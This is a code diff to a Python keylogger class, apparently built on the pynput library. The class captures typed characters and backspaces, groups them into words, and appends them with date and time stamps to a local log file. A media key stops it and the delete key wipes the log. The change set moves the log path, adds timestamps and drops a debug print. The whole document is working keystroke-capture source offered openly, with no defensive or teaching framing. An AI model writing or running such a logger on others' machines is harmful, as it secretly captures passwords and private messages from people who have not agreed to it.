@@ -12,21 +12,22 @@ class Keylogger:
     def __init__(self):
         self.ll = ''
         self.poss_words = []
-        print('Running...')
+        print("Running...")
 
     def __call__(self, key):
         if key == k.Key.media_next:  # Using the "media-next" button will stop the program
             if self.ll == '':
                 # Program will take this route if the var "ll" is an empty string when the shutoff happens
                 g = ""
-                with open("log.txt", "a+") as log:
+                with open("Keylogger/log.txt", "a+") as log:
                     num = 0
                     date = datetime.datetime.now()
                     dates = date.strftime("%b/%d/%Y")
+                    time = date.strftime("%I:%M%p")
                     for i in self.poss_words:
                         num += 1
                         g += f"{i} "
-                    log.write(f"Text Count {num} on {dates}: {g}\n")
+                    log.write(f"Text Log on {dates} at {time}: {g}\n")
                 print("Logged and exited successfully!")  # Signs out after logging into log.txt
                 exit()
             else:
@@ -34,14 +35,16 @@ class Keylogger:
                 self.poss_words.append(self.ll)
                 self.num += 1
                 g = ''
-                with open("log.txt", "a+") as log:
+                date = datetime.datetime.now()
+                dates = date.strftime("%b/%d/%Y")
+                time = date.strftime("%I:%M%p")
+                with open("Keylogger/log.txt", "a+") as log:
                     num = 0
                     for i in self.poss_words:
                         num += 1
                         g += f"{i} "
-                    log.write(f"Text Count {num}: {g}\n")
+                    log.write(f"Text Log on {dates} at {time}: {g}\n")
                     print("Logged and exited successfully!")  # Signs out after logging into log.txt
-                print(self.poss_words)
                 exit()
         elif hasattr(key, 'char'):
             self.ll += key.char
@@ -52,7 +55,7 @@ class Keylogger:
         elif key == k.Key.backspace:
             self.ll = self.ll[:-1]
         elif key == k.Key.delete:
-            with open("log.txt", "w") as l:
+            with open("Keylogger/log.txt", "w") as l:
                 l.write("")
             print("Log Successfully Cleared")
 
